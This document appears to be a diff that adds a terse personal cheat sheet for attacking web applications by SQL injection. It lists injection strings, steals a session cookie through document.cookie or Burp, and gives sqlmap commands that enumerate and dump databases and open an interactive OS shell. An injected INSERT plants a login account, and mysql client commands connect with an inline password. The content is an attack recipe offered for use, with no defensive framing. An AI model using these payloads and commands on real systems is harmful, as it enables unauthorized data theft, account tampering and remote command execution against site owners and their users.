@@ -1,0 +1,51 @@
+
+
+SQL MAP
+
+
+
+Open the vulnerable website / blah' or 1=1 --       / a’     /    ‘ or 1=1;-- -
+Copy the cookie from the inspect element – console document.cookie /or from burpsuite
+Open the terminal to use sqlmap 
+
+
+
+
+sqlmap  -u "http://www.example.com/viewp.aspx?id=1" –cookie "mscope=uydl="  -p <injection point>
+
+
+#or without injection point
+
+sqlmap -u "http://www.text.com/viewpr.aspx?id=1" --cookie="mscope=1jwuydl=; ui-tabs-1=0"
+
+
+--dbs
+-D <databasename>   --tables
+-D <databasename>      -T <table name>    --column
+-D <databasename>      -T <table name>    -C <column name>  --dump
+
+
+
+sqlmap -u http://www.test.com/viewprofile.aspx?id=1" --cookie="msco==; ui-tabs-1=0" --os-shell
+#It opens up the Interactive OS shell.
+
+------------------------------------------------------------------------------------------
+
+blah';insert into login values ('john','apple123'); -- 
+
+
+------------------------------------------------------------------------------------------
+
+MYSQL   #port 3306
+
+
+
+mysql  -u admin  -Ppasswod  -h 192.168.1.8
+
+
+show databases;
+use <database name>;
+show tables;
+select *from <table name>
+
+# or   use <table name>; select *from
